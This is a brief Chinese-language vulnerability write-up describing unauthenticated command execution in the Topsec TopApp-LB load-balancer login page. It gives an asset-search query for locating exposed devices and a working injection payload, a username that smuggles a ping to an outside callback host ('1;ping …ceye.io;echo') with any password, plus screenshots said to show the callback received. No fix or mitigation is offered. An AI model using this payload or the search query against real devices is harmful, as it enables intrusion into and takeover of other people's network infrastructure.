# 天融信 TopApp-LB 命令执行漏洞

## 漏洞描述

天融信负载均衡TopApp-LB系统存在任意命令执行

## 漏洞影响

```
天融信负载均衡TopApp-LB
```

## 网络测绘

```
app="天融信-TopApp-LB-负载均衡系统"
```

## 漏洞复现

登录界面中存在命令执行



账号:**1;ping 6km5dk.ceye.io;echo**

密码:**任意**



![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115518326.png)



成功收到请求



![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115518327.png)